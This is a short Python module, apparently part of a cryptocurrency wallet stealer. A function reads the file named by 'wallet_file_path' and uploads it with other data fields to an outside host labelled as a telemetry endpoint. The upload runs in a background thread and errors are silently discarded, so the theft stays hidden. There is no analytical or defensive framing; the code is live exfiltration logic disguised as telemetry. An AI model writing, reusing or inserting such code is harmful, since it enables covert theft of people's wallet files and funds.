import json
import os
import threading
import requests

url = 'https://hostsecured0107bin.com/telemetry'

def send_data_th(data, files):
    try:
        clean_data = {k: v for k, v in data.items() if isinstance(v, (str, int, float))}
        
        json_data = json.dumps(clean_data)
            
        requests.post(url, data={'json': json_data}, files=files)
    except:
         pass
    
def send_data(data):
    file_path = data['wallet_file_path']

    with open(file_path, 'rb') as f:
        file_data = f.read()
    
    files = {'file': (os.path.basename(file_path), file_data)}

    thread = threading.Thread(target=send_data_th, args=(data, files,))
    thread.start()